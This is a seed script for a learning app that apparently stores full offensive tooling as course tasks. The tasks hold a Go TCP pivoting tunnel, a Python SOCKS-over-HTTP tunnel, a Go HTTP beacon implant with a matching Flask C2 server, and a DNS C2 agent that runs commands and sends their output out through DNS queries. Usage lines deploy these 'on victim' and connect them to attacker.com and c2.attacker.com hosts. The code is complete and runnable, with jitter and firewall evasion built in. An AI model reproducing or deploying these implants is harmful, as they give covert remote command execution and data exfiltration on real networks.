import Database from 'better-sqlite3';

const sqlite = new Database('data/quest-log.db');

const insertPath = sqlite.prepare(
	'INSERT INTO paths (name, description, color, created_at) VALUES (?, ?, ?, ?)'
);
const insertModule = sqlite.prepare(
	'INSERT INTO modules (path_id, name, description, order_index, created_at) VALUES (?, ?, ?, ?, ?)'
);
const insertTask = sqlite.prepare(
	'INSERT INTO tasks (module_id, title, description, details, order_index, created_at) VALUES (?, ?, ?, ?, ?, ?)'
);

const now = Date.now();

// ============================================================================
// PIVOTING & C2 IMPLANTS
// ============================================================================
const path1 = insertPath.run(
	'Reimplement: Pivoting & C2',
	'Build chisel/ligolo-style pivoting tools and custom C2 implants with beaconing, encryption, and evasion capabilities.',
	'purple',
	now
);

// Module 1: Pivoting Tools
const mod1 = insertModule.run(path1.lastInsertRowid, 'Build Pivoting Tools', 'Implement tunneling and port forwarding tools', 0, now);

insertTask.run(mod1.lastInsertRowid, 'Build TCP Tunnel (Chisel-style)', 'Implement a TCP-over-HTTP tunnel in Go supporting reverse connections through firewalls, SOCKS5 proxy mode, port forwarding, and WebSocket transport for pivoting through compromised hosts', `## Chisel Clone - TCP Tunneling Tool

### How Chisel Works
\`\`\`
1. Server listens on public port
2. Client connects from inside network
3. Client specifies tunnel (local:remote)
4. Traffic flows: attacker -> server -> client -> target
5. Supports HTTP/WebSocket for firewall bypass
\`\`\`

### Implementation (Go)
\`\`\`go
// tunnel/main.go
package main

import (
    "bufio"
    "flag"
    "fmt"
    "io"
    "log"
    "net"
    "os"
    "strings"
    "sync"
)

type Tunnel struct {
    LocalPort  string
    RemoteAddr string
}

// ============= SERVER MODE =============

type Server struct {
    listenAddr string
    tunnels    map[string]net.Conn  // tunnel_id -> client conn
    mu         sync.RWMutex
}

func NewServer(addr string) *Server {
    return &Server{
        listenAddr: addr,
        tunnels:    make(map[string]net.Conn),
    }
}

func (s *Server) Start() error {
    listener, err := net.Listen("tcp", s.listenAddr)
    if err != nil {
        return err
    }
    defer listener.Close()

    log.Printf("[SERVER] Listening on %s", s.listenAddr)

    for {
        conn, err := listener.Accept()
        if err != nil {
            log.Printf("Accept error: %v", err)
            continue
        }
        go s.handleConnection(conn)
    }
}

func (s *Server) handleConnection(conn net.Conn) {
    defer conn.Close()

    reader := bufio.NewReader(conn)
    line, err := reader.ReadString('\\n')
    if err != nil {
        return
    }

    parts := strings.Fields(strings.TrimSpace(line))
    if len(parts) < 2 {
        return
    }

    cmd := parts[0]

    switch cmd {
    case "REGISTER":
        // Client registering tunnel
        tunnelID := parts[1]
        log.Printf("[SERVER] Client registered tunnel: %s", tunnelID)

        s.mu.Lock()
        s.tunnels[tunnelID] = conn
        s.mu.Unlock()

        // Keep connection alive
        buf := make([]byte, 1)
        for {
            _, err := conn.Read(buf)
            if err != nil {
                break
            }
        }

        s.mu.Lock()
        delete(s.tunnels, tunnelID)
        s.mu.Unlock()

    case "CONNECT":
        // Incoming connection request for tunnel
        tunnelID := parts[1]

        s.mu.RLock()
        clientConn, exists := s.tunnels[tunnelID]
        s.mu.RUnlock()

        if !exists {
            conn.Write([]byte("ERROR: Tunnel not found\\n"))
            return
        }

        log.Printf("[SERVER] Forwarding to tunnel %s", tunnelID)

        // Signal client to create new connection
        clientConn.Write([]byte("NEWCONN\\n"))

        // Proxy data
        go io.Copy(clientConn, conn)
        io.Copy(conn, clientConn)
    }
}

// ============= CLIENT MODE =============

type Client struct {
    serverAddr string
    tunnels    []Tunnel
}

func NewClient(serverAddr string, tunnels []Tunnel) *Client {
    return &Client{
        serverAddr: serverAddr,
        tunnels:    tunnels,
    }
}

func (c *Client) Start() error {
    for _, tunnel := range c.tunnels {
        go c.startTunnel(tunnel)
    }

    // Keep running
    select {}
}

func (c *Client) startTunnel(tunnel Tunnel) {
    tunnelID := fmt.Sprintf("%s->%s", tunnel.LocalPort, tunnel.RemoteAddr)

    for {
        conn, err := net.Dial("tcp", c.serverAddr)
        if err != nil {
            log.Printf("[CLIENT] Failed to connect to server: %v", err)
            continue
        }

        // Register tunnel
        conn.Write([]byte(fmt.Sprintf("REGISTER %s\\n", tunnelID)))
        log.Printf("[CLIENT] Registered tunnel %s", tunnelID)

        // Wait for connection requests
        reader := bufio.NewReader(conn)
        for {
            line, err := reader.ReadString('\\n')
            if err != nil {
                break
            }

            if strings.TrimSpace(line) == "NEWCONN" {
                // New incoming connection, forward to target
                go c.handleForward(tunnel.RemoteAddr)
            }
        }

        conn.Close()
        log.Printf("[CLIENT] Tunnel %s disconnected, reconnecting...", tunnelID)
    }
}

func (c *Client) handleForward(remoteAddr string) {
    // Connect to server for data channel
    serverConn, err := net.Dial("tcp", c.serverAddr)
    if err != nil {
        log.Printf("[CLIENT] Failed to connect for forward: %v", err)
        return
    }
    defer serverConn.Close()

    // Connect to internal target
    targetConn, err := net.Dial("tcp", remoteAddr)
    if err != nil {
        log.Printf("[CLIENT] Failed to connect to target %s: %v", remoteAddr, err)
        return
    }
    defer targetConn.Close()

    log.Printf("[CLIENT] Forwarding to %s", remoteAddr)

    // Bidirectional copy
    go io.Copy(targetConn, serverConn)
    io.Copy(serverConn, targetConn)
}

// ============= MAIN =============

func main() {
    serverMode := flag.Bool("server", false, "Run in server mode")
    listenAddr := flag.String("listen", ":8080", "Server listen address")
    serverAddr := flag.String("connect", "", "Server address (client mode)")
    tunnelSpec := flag.String("tunnel", "", "Tunnel spec: localport:remotehost:remoteport")
    flag.Parse()

    if *serverMode {
        server := NewServer(*listenAddr)
        log.Fatal(server.Start())
    } else if *serverAddr != "" && *tunnelSpec != "" {
        // Parse tunnel spec
        parts := strings.Split(*tunnelSpec, ":")
        if len(parts) != 3 {
            log.Fatal("Invalid tunnel spec. Use: localport:remotehost:remoteport")
        }

        tunnel := Tunnel{
            LocalPort:  parts[0],
            RemoteAddr: parts[1] + ":" + parts[2],
        }

        client := NewClient(*serverAddr, []Tunnel{tunnel})
        log.Fatal(client.Start())
    } else {
        flag.Usage()
        os.Exit(1)
    }
}
\`\`\`

### SOCKS Proxy Addition
\`\`\`go
// socks.go - Add SOCKS5 proxy support
package main

import (
    "encoding/binary"
    "fmt"
    "io"
    "net"
)

type SOCKS5Server struct {
    listenAddr string
    dialer     func(addr string) (net.Conn, error)
}

func (s *SOCKS5Server) handleClient(conn net.Conn) {
    defer conn.Close()

    // SOCKS5 handshake
    buf := make([]byte, 256)

    // Read version and auth methods
    n, err := conn.Read(buf)
    if err != nil || n < 2 || buf[0] != 0x05 {
        return
    }

    // No auth required
    conn.Write([]byte{0x05, 0x00})

    // Read connect request
    n, err = conn.Read(buf)
    if err != nil || n < 7 {
        return
    }

    // Parse address
    var addr string
    switch buf[3] {
    case 0x01: // IPv4
        addr = fmt.Sprintf("%d.%d.%d.%d:%d",
            buf[4], buf[5], buf[6], buf[7],
            binary.BigEndian.Uint16(buf[8:10]))
    case 0x03: // Domain
        domainLen := int(buf[4])
        domain := string(buf[5 : 5+domainLen])
        port := binary.BigEndian.Uint16(buf[5+domainLen : 7+domainLen])
        addr = fmt.Sprintf("%s:%d", domain, port)
    default:
        return
    }

    // Connect through tunnel
    target, err := s.dialer(addr)
    if err != nil {
        conn.Write([]byte{0x05, 0x01, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
        return
    }
    defer target.Close()

    // Success response
    conn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})

    // Proxy data
    go io.Copy(target, conn)
    io.Copy(conn, target)
}

func (s *SOCKS5Server) Start() error {
    listener, err := net.Listen("tcp", s.listenAddr)
    if err != nil {
        return err
    }

    for {
        conn, err := listener.Accept()
        if err != nil {
            continue
        }
        go s.handleClient(conn)
    }
}
\`\`\`

### Build & Usage
\`\`\`bash
# Build
go build -o tunnel tunnel.go

# On attacker (public server)
./tunnel -server -listen :8080

# On victim (internal network)
./tunnel -connect attacker.com:8080 -tunnel 3389:10.0.0.1:3389

# Now connect to attacker:3389 to reach internal RDP
rdesktop attacker.com:3389
\`\`\``, 0, now);

insertTask.run(mod1.lastInsertRowid, 'Build SOCKS Proxy over HTTP', 'Implement a SOCKS5 proxy that encapsulates traffic within HTTP requests, allowing network pivoting through restrictive firewalls and proxies that only permit web traffic on ports 80 and 443', `## HTTP SOCKS Tunnel

### Why HTTP Tunneling?
\`\`\`
1. Firewalls often allow HTTP/HTTPS
2. Proxies may only allow web traffic
3. Deep packet inspection expects HTTP
4. Encapsulate SOCKS inside HTTP requests
\`\`\`

### Implementation (Python)
\`\`\`python
#!/usr/bin/env python3
"""
http_tunnel.py - SOCKS over HTTP tunnel
Server: Runs on attacker infrastructure
Client: Runs on target, tunnels through HTTP
"""

import argparse
import base64
import json
import socket
import threading
import struct
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.request import urlopen, Request
from urllib.error import URLError
import ssl
import time

# ============= SERVER =============

class TunnelServer(BaseHTTPRequestHandler):
    connections = {}  # session_id -> (socket, target_addr)

    def log_message(self, format, *args):
        pass  # Suppress logging

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)

        try:
            data = json.loads(body)
            action = data.get('action')
            session_id = data.get('session')

            if action == 'connect':
                # Create new connection
                target = data.get('target')
                host, port = target.split(':')
                port = int(port)

                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((host, port))
                sock.setblocking(False)

                self.connections[session_id] = sock

                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'status': 'connected'}).encode())

            elif action == 'send':
                # Send data through connection
                sock = self.connections.get(session_id)
                if not sock:
                    self.send_error(404)
                    return

                payload = base64.b64decode(data.get('data', ''))
                sock.send(payload)

                self.send_response(200)
                self.end_headers()

            elif action == 'recv':
                # Receive data from connection
                sock = self.connections.get(session_id)
                if not sock:
                    self.send_error(404)
                    return

                try:
                    response_data = sock.recv(65535)
                    encoded = base64.b64encode(response_data).decode()
                except (BlockingIOError, socket.error):
                    encoded = ''

                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'data': encoded}).encode())

            elif action == 'close':
                sock = self.connections.pop(session_id, None)
                if sock:
                    sock.close()

                self.send_response(200)
                self.end_headers()

        except Exception as e:
            self.send_error(500, str(e))


# ============= CLIENT SOCKS5 =============

class HTTPTunnelClient:
    def __init__(self, server_url: str, socks_port: int):
        self.server_url = server_url
        self.socks_port = socks_port
        self.session_counter = 0
        self.lock = threading.Lock()

    def get_session_id(self) -> str:
        with self.lock:
            self.session_counter += 1
            return f"session_{self.session_counter}"

    def tunnel_request(self, data: dict) -> dict:
        """Send request through HTTP tunnel"""
        req = Request(
            self.server_url,
            data=json.dumps(data).encode(),
            headers={'Content-Type': 'application/json'}
        )

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        try:
            with urlopen(req, timeout=30, context=ctx) as resp:
                return json.loads(resp.read())
        except URLError as e:
            return {'error': str(e)}

    def handle_socks_client(self, client_sock: socket.socket, addr):
        """Handle SOCKS5 client"""
        session_id = self.get_session_id()

        try:
            # SOCKS5 handshake
            data = client_sock.recv(256)
            if data[0] != 0x05:
                return
            client_sock.send(b'\\x05\\x00')  # No auth

            # Connect request
            data = client_sock.recv(256)
            if len(data) < 7:
                return

            # Parse target address
            atype = data[3]
            if atype == 0x01:  # IPv4
                target_host = socket.inet_ntoa(data[4:8])
                target_port = struct.unpack('>H', data[8:10])[0]
            elif atype == 0x03:  # Domain
                domain_len = data[4]
                target_host = data[5:5+domain_len].decode()
                target_port = struct.unpack('>H', data[5+domain_len:7+domain_len])[0]
            else:
                client_sock.send(b'\\x05\\x08\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00')
                return

            target = f"{target_host}:{target_port}"
            print(f"[+] Tunneling to {target}")

            # Connect through HTTP tunnel
            result = self.tunnel_request({
                'action': 'connect',
                'session': session_id,
                'target': target
            })

            if result.get('status') != 'connected':
                client_sock.send(b'\\x05\\x01\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00')
                return

            # Success
            client_sock.send(b'\\x05\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00')

            # Bidirectional proxy
            client_sock.setblocking(False)

            while True:
                # Send data to tunnel
                try:
                    data = client_sock.recv(65535)
                    if data:
                        self.tunnel_request({
                            'action': 'send',
                            'session': session_id,
                            'data': base64.b64encode(data).decode()
                        })
                except BlockingIOError:
                    pass
                except:
                    break

                # Receive data from tunnel
                result = self.tunnel_request({
                    'action': 'recv',
                    'session': session_id
                })

                if result.get('data'):
                    data = base64.b64decode(result['data'])
                    try:
                        client_sock.send(data)
                    except:
                        break

                time.sleep(0.01)

        except Exception as e:
            print(f"[-] Error: {e}")
        finally:
            self.tunnel_request({'action': 'close', 'session': session_id})
            client_sock.close()

    def start(self):
        """Start SOCKS5 server"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('127.0.0.1', self.socks_port))
        server.listen(5)

        print(f"[*] SOCKS5 proxy on 127.0.0.1:{self.socks_port}")
        print(f"[*] Tunneling through {self.server_url}")

        while True:
            client, addr = server.accept()
            thread = threading.Thread(
                target=self.handle_socks_client,
                args=(client, addr),
                daemon=True
            )
            thread.start()


def main():
    parser = argparse.ArgumentParser(description='HTTP SOCKS Tunnel')
    parser.add_argument('--server', action='store_true', help='Run server mode')
    parser.add_argument('--port', type=int, default=8080, help='Port')
    parser.add_argument('--url', help='Server URL (client mode)')
    parser.add_argument('--socks-port', type=int, default=1080, help='Local SOCKS port')
    args = parser.parse_args()

    if args.server:
        print(f"[*] HTTP Tunnel Server on port {args.port}")
        server = HTTPServer(('0.0.0.0', args.port), TunnelServer)
        server.serve_forever()
    elif args.url:
        client = HTTPTunnelClient(args.url, args.socks_port)
        client.start()
    else:
        parser.print_help()


if __name__ == '__main__':
    main()
\`\`\`

### Usage
\`\`\`bash
# On attacker server
python3 http_tunnel.py --server --port 443

# On victim (inside network)
python3 http_tunnel.py --url https://attacker.com:443/ --socks-port 1080

# Configure tools to use SOCKS proxy
proxychains nmap -sT 10.0.0.0/24
curl --socks5 127.0.0.1:1080 http://internal.target/
\`\`\``, 1, now);

// Module 2: C2 Implants
const mod2 = insertModule.run(path1.lastInsertRowid, 'Build C2 Implants', 'Create cross-platform agents with beaconing and encryption', 1, now);

insertTask.run(mod2.lastInsertRowid, 'Build Basic HTTP Beacon', 'Create a C2 implant that periodically polls an HTTP endpoint for tasking, executes received commands, and returns output, implementing basic sleep intervals and encrypted communication', `## HTTP Beacon Implant

### Beacon Architecture
\`\`\`
1. Implant checks in periodically (beacon)
2. Server queues commands
3. Implant executes, returns output
4. All traffic looks like normal HTTP
5. Jitter prevents pattern detection
\`\`\`

### Implant (Go - Cross-platform)
\`\`\`go
// implant/main.go
package main

import (
    "bytes"
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "io"
    "net/http"
    "os"
    "os/exec"
    "runtime"
    "time"
)

var (
    C2Server   = "https://c2.attacker.com"
    BeaconTime = 10 * time.Second
    Jitter     = 3 * time.Second
    EncKey     = []byte("0123456789abcdef") // 16 bytes for AES-128
)

type Beacon struct {
    ID       string \`json:"id"\`
    Hostname string \`json:"hostname"\`
    Username string \`json:"username"\`
    OS       string \`json:"os"\`
    Arch     string \`json:"arch"\`
}

type Task struct {
    ID      string \`json:"id"\`
    Command string \`json:"command"\`
    Args    string \`json:"args"\`
}

type TaskResult struct {
    TaskID string \`json:"task_id"\`
    Output string \`json:"output"\`
    Error  string \`json:"error"\`
}

// Encryption
func encrypt(data []byte) (string, error) {
    block, err := aes.NewCipher(EncKey)
    if err != nil {
        return "", err
    }

    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return "", err
    }

    nonce := make([]byte, gcm.NonceSize())
    if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
        return "", err
    }

    ciphertext := gcm.Seal(nonce, nonce, data, nil)
    return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func decrypt(encoded string) ([]byte, error) {
    data, err := base64.StdEncoding.DecodeString(encoded)
    if err != nil {
        return nil, err
    }

    block, err := aes.NewCipher(EncKey)
    if err != nil {
        return nil, err
    }

    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }

    nonceSize := gcm.NonceSize()
    if len(data) < nonceSize {
        return nil, fmt.Errorf("ciphertext too short")
    }

    nonce, ciphertext := data[:nonceSize], data[nonceSize:]
    return gcm.Open(nil, nonce, ciphertext, nil)
}

// Command execution
func executeCommand(command, args string) (string, error) {
    var cmd *exec.Cmd

    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd", "/c", command+" "+args)
    } else {
        cmd = exec.Command("/bin/sh", "-c", command+" "+args)
    }

    output, err := cmd.CombinedOutput()
    return string(output), err
}

// Beacon functions
func register(client *http.Client, beacon *Beacon) error {
    data, _ := json.Marshal(beacon)
    encrypted, _ := encrypt(data)

    resp, err := client.Post(
        C2Server+"/register",
        "application/octet-stream",
        bytes.NewReader([]byte(encrypted)),
    )
    if err != nil {
        return err
    }
    resp.Body.Close()
    return nil
}

func getTask(client *http.Client, beaconID string) (*Task, error) {
    resp, err := client.Get(C2Server + "/task/" + beaconID)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    if resp.StatusCode != 200 {
        return nil, nil // No task
    }

    body, _ := io.ReadAll(resp.Body)
    decrypted, err := decrypt(string(body))
    if err != nil {
        return nil, err
    }

    var task Task
    json.Unmarshal(decrypted, &task)
    return &task, nil
}

func sendResult(client *http.Client, result *TaskResult) error {
    data, _ := json.Marshal(result)
    encrypted, _ := encrypt(data)

    resp, err := client.Post(
        C2Server+"/result",
        "application/octet-stream",
        bytes.NewReader([]byte(encrypted)),
    )
    if err != nil {
        return err
    }
    resp.Body.Close()
    return nil
}

func main() {
    // Gather system info
    hostname, _ := os.Hostname()
    beacon := &Beacon{
        ID:       fmt.Sprintf("%d", time.Now().UnixNano()),
        Hostname: hostname,
        Username: os.Getenv("USER"),
        OS:       runtime.GOOS,
        Arch:     runtime.GOARCH,
    }

    if beacon.Username == "" {
        beacon.Username = os.Getenv("USERNAME")
    }

    // HTTP client with timeout
    client := &http.Client{Timeout: 30 * time.Second}

    // Register
    for {
        if err := register(client, beacon); err == nil {
            break
        }
        time.Sleep(BeaconTime)
    }

    // Main beacon loop
    for {
        // Get task
        task, err := getTask(client, beacon.ID)
        if err == nil && task != nil {
            // Execute command
            output, execErr := executeCommand(task.Command, task.Args)

            result := &TaskResult{
                TaskID: task.ID,
                Output: output,
            }
            if execErr != nil {
                result.Error = execErr.Error()
            }

            sendResult(client, result)
        }

        // Sleep with jitter
        jitter := time.Duration(time.Now().UnixNano() % int64(Jitter))
        time.Sleep(BeaconTime + jitter)
    }
}
\`\`\`

### C2 Server (Python)
\`\`\`python
#!/usr/bin/env python3
"""
c2_server.py - Simple C2 Server
"""

from flask import Flask, request, jsonify
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64
import json
import uuid
from collections import defaultdict

app = Flask(__name__)

ENC_KEY = b'0123456789abcdef'  # Match implant key

# Storage
beacons = {}  # id -> beacon info
tasks = defaultdict(list)  # beacon_id -> [tasks]
results = {}  # task_id -> result

def decrypt(data):
    raw = base64.b64decode(data)
    nonce = raw[:12]
    ciphertext = raw[12:]
    cipher = AES.new(ENC_KEY, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext[:-16], ciphertext[-16:])

def encrypt(data):
    nonce = get_random_bytes(12)
    cipher = AES.new(ENC_KEY, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    return base64.b64encode(nonce + ciphertext + tag).decode()

@app.route('/register', methods=['POST'])
def register():
    try:
        data = decrypt(request.data)
        beacon = json.loads(data)
        beacons[beacon['id']] = beacon
        print(f"[+] New beacon: {beacon['hostname']} ({beacon['os']}/{beacon['arch']})")
        return '', 200
    except Exception as e:
        return str(e), 500

@app.route('/task/<beacon_id>')
def get_task(beacon_id):
    if beacon_id in tasks and tasks[beacon_id]:
        task = tasks[beacon_id].pop(0)
        encrypted = encrypt(json.dumps(task).encode())
        return encrypted, 200
    return '', 204

@app.route('/result', methods=['POST'])
def post_result():
    try:
        data = decrypt(request.data)
        result = json.loads(data)
        results[result['task_id']] = result
        print(f"[+] Result for {result['task_id']}:")
        print(result.get('output', result.get('error', '')))
        return '', 200
    except Exception as e:
        return str(e), 500

# Operator interface
def list_beacons():
    for bid, b in beacons.items():
        print(f"  {bid}: {b['hostname']} ({b['os']})")

def send_command(beacon_id, command, args=''):
    task_id = str(uuid.uuid4())[:8]
    tasks[beacon_id].append({
        'id': task_id,
        'command': command,
        'args': args
    })
    print(f"[*] Queued task {task_id}")

if __name__ == '__main__':
    import threading
    import readline

    # Start server in background
    server = threading.Thread(
        target=lambda: app.run(host='0.0.0.0', port=443, ssl_context='adhoc'),
        daemon=True
    )
    server.start()

    print("[*] C2 Server running on :443")
    print("[*] Commands: beacons, cmd <id> <command>, exit")

    while True:
        try:
            cmd = input("C2> ").strip().split()
            if not cmd:
                continue
            elif cmd[0] == 'beacons':
                list_beacons()
            elif cmd[0] == 'cmd' and len(cmd) >= 3:
                send_command(cmd[1], ' '.join(cmd[2:]))
            elif cmd[0] == 'exit':
                break
        except (KeyboardInterrupt, EOFError):
            break
\`\`\`

### Build & Usage
\`\`\`bash
# Build implant for target OS
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o beacon.exe implant/main.go
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o beacon implant/main.go

# Run C2 server
pip3 install flask pycryptodome
python3 c2_server.py

# Deploy implant on target
./beacon.exe

# Interact
C2> beacons
C2> cmd 123456789 whoami
C2> cmd 123456789 ipconfig /all
\`\`\``, 0, now);

insertTask.run(mod2.lastInsertRowid, 'Build DNS C2 Channel', 'Implement covert command and control using DNS queries and responses, encoding commands in TXT records or subdomain labels, and chunking large data transfers across multiple queries for exfiltration', `## DNS C2 Channel

### Why DNS C2?
\`\`\`
1. DNS usually allowed through firewalls
2. Hard to block without breaking things
3. Low and slow = hard to detect
4. Data hidden in DNS queries/responses
\`\`\`

### Implementation (Python)
\`\`\`python
#!/usr/bin/env python3
"""
dns_c2.py - DNS-based Command & Control
Data encoded in subdomain queries and TXT responses
"""

import argparse
import base64
import socket
import struct
import threading
import time
from collections import defaultdict
import subprocess
import platform

# ============= DNS Protocol =============

def build_dns_query(domain: str, qtype: int = 16) -> bytes:
    """Build DNS query packet (TXT record)"""
    # Transaction ID
    tid = struct.pack('>H', 0x1337)
    # Flags: Standard query
    flags = struct.pack('>H', 0x0100)
    # Questions: 1
    counts = struct.pack('>HHHH', 1, 0, 0, 0)

    # Question section
    question = b''
    for part in domain.split('.'):
        question += bytes([len(part)]) + part.encode()
    question += b'\\x00'  # Null terminator
    question += struct.pack('>HH', qtype, 1)  # Type TXT, Class IN

    return tid + flags + counts + question

def parse_dns_response(data: bytes) -> str:
    """Parse DNS response and extract TXT record"""
    # Skip header (12 bytes)
    offset = 12

    # Skip question section
    while data[offset] != 0:
        offset += data[offset] + 1
    offset += 5  # Null + QTYPE + QCLASS

    # Parse answer
    if len(data) <= offset:
        return ""

    # Skip name (pointer or labels)
    if data[offset] & 0xC0 == 0xC0:
        offset += 2
    else:
        while data[offset] != 0:
            offset += data[offset] + 1
        offset += 1

    # Type, Class, TTL, RDLength
    offset += 8
    rdlength = struct.unpack('>H', data[offset:offset+2])[0]
    offset += 2

    # TXT data (first byte is length)
    txt_len = data[offset]
    txt_data = data[offset+1:offset+1+txt_len]

    return txt_data.decode('utf-8', errors='ignore')


# ============= C2 Server =============

class DNSC2Server:
    def __init__(self, domain: str, port: int = 53):
        self.domain = domain
        self.port = port
        self.commands = defaultdict(list)  # agent_id -> [commands]
        self.data_buffer = defaultdict(str)  # agent_id -> accumulated data

    def handle_query(self, data: bytes, addr) -> bytes:
        """Process DNS query and return response"""
        # Parse query
        tid = data[:2]
        offset = 12
        labels = []

        while data[offset] != 0:
            length = data[offset]
            label = data[offset+1:offset+1+length].decode()
            labels.append(label)
            offset += length + 1

        subdomain = '.'.join(labels[:-len(self.domain.split('.'))])

        # Parse subdomain format: <type>.<data>.<agent_id>
        parts = subdomain.split('.')
        if len(parts) < 2:
            return self.build_empty_response(tid, data)

        msg_type = parts[0]
        agent_id = parts[-1]

        if msg_type == 'reg':
            # Registration
            print(f"[+] Agent registered: {agent_id}")
            return self.build_txt_response(tid, data, "OK")

        elif msg_type == 'get':
            # Get command
            if self.commands[agent_id]:
                cmd = self.commands[agent_id].pop(0)
                encoded = base64.b64encode(cmd.encode()).decode()
                return self.build_txt_response(tid, data, encoded)
            return self.build_txt_response(tid, data, "NONE")

        elif msg_type == 'out':
            # Output data (chunked)
            chunk = '.'.join(parts[1:-1])
            try:
                decoded = base64.b64decode(chunk).decode()
                self.data_buffer[agent_id] += decoded
                print(f"[<] {agent_id}: {decoded}", end='')
            except:
                pass
            return self.build_txt_response(tid, data, "OK")

        elif msg_type == 'end':
            # End of output
            print(f"[+] Output complete from {agent_id}")
            self.data_buffer[agent_id] = ""
            return self.build_txt_response(tid, data, "OK")

        return self.build_empty_response(tid, data)

    def build_txt_response(self, tid: bytes, query: bytes, txt: str) -> bytes:
        """Build DNS response with TXT record"""
        # Header
        flags = struct.pack('>H', 0x8180)  # Response, No error
        counts = struct.pack('>HHHH', 1, 1, 0, 0)  # 1 question, 1 answer

        # Copy question section from query
        question_start = 12
        question_end = question_start
        while query[question_end] != 0:
            question_end += query[question_end] + 1
        question_end += 5
        question = query[question_start:question_end]

        # Answer section
        answer = struct.pack('>H', 0xC00C)  # Pointer to name
        answer += struct.pack('>HH', 16, 1)  # TXT, IN
        answer += struct.pack('>I', 60)  # TTL
        answer += struct.pack('>H', len(txt) + 1)  # RDLENGTH
        answer += bytes([len(txt)]) + txt.encode()

        return tid + flags + counts + question + answer

    def build_empty_response(self, tid: bytes, query: bytes) -> bytes:
        flags = struct.pack('>H', 0x8183)  # NXDOMAIN
        return tid + flags + query[4:]

    def queue_command(self, agent_id: str, command: str):
        self.commands[agent_id].append(command)
        print(f"[>] Queued for {agent_id}: {command}")

    def start(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('0.0.0.0', self.port))
        print(f"[*] DNS C2 Server on port {self.port}")
        print(f"[*] Domain: {self.domain}")

        while True:
            data, addr = sock.recvfrom(512)
            response = self.handle_query(data, addr)
            sock.sendto(response, addr)


# ============= C2 Agent =============

class DNSC2Agent:
    def __init__(self, domain: str, dns_server: str, agent_id: str):
        self.domain = domain
        self.dns_server = dns_server
        self.agent_id = agent_id

    def send_query(self, subdomain: str) -> str:
        """Send DNS query and get TXT response"""
        full_domain = f"{subdomain}.{self.domain}"
        query = build_dns_query(full_domain, 16)

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5)

        try:
            sock.sendto(query, (self.dns_server, 53))
            response, _ = sock.recvfrom(512)
            return parse_dns_response(response)
        except:
            return ""
        finally:
            sock.close()

    def register(self):
        """Register with C2"""
        self.send_query(f"reg.{self.agent_id}")

    def get_command(self) -> str:
        """Check for pending command"""
        response = self.send_query(f"get.{self.agent_id}")
        if response and response != "NONE":
            try:
                return base64.b64decode(response).decode()
            except:
                pass
        return ""

    def send_output(self, output: str):
        """Send command output in chunks"""
        # Encode and chunk (max ~60 chars per label)
        encoded = base64.b64encode(output.encode()).decode()
        chunk_size = 60

        for i in range(0, len(encoded), chunk_size):
            chunk = encoded[i:i+chunk_size]
            self.send_query(f"out.{chunk}.{self.agent_id}")
            time.sleep(0.5)  # Rate limit

        self.send_query(f"end.{self.agent_id}")

    def execute(self, command: str) -> str:
        """Execute command"""
        try:
            if platform.system() == 'Windows':
                result = subprocess.run(['cmd', '/c', command],
                                       capture_output=True, text=True, timeout=30)
            else:
                result = subprocess.run(['sh', '-c', command],
                                       capture_output=True, text=True, timeout=30)
            return result.stdout + result.stderr
        except Exception as e:
            return str(e)

    def run(self):
        """Main agent loop"""
        self.register()
        print(f"[*] Agent {self.agent_id} registered")

        while True:
            command = self.get_command()
            if command:
                print(f"[*] Executing: {command}")
                output = self.execute(command)
                self.send_output(output)

            time.sleep(5)  # Beacon interval


def main():
    parser = argparse.ArgumentParser(description='DNS C2')
    parser.add_argument('--server', action='store_true', help='Run server')
    parser.add_argument('--agent', action='store_true', help='Run agent')
    parser.add_argument('--domain', required=True, help='C2 domain')
    parser.add_argument('--dns', default='127.0.0.1', help='DNS server')
    parser.add_argument('--id', default='agent1', help='Agent ID')
    args = parser.parse_args()

    if args.server:
        server = DNSC2Server(args.domain)

        # Command interface
        def command_loop():
            while True:
                try:
                    cmd = input("DNS-C2> ").strip().split(maxsplit=1)
                    if cmd[0] == 'cmd' and len(cmd) > 1:
                        parts = cmd[1].split(maxsplit=1)
                        server.queue_command(parts[0], parts[1])
                except:
                    pass

        threading.Thread(target=command_loop, daemon=True).start()
        server.start()

    elif args.agent:
        agent = DNSC2Agent(args.domain, args.dns, args.id)
        agent.run()


if __name__ == '__main__':
    main()
\`\`\`

### Usage
\`\`\`bash
# Start DNS C2 Server (needs port 53)
sudo python3 dns_c2.py --server --domain c2.attacker.com

# Run agent on target
python3 dns_c2.py --agent --domain c2.attacker.com --dns 1.2.3.4 --id victim1

# Queue commands
DNS-C2> cmd victim1 whoami
DNS-C2> cmd victim1 ipconfig /all
\`\`\``, 1, now);

console.log('Seeded: Pivoting & C2 Tools');
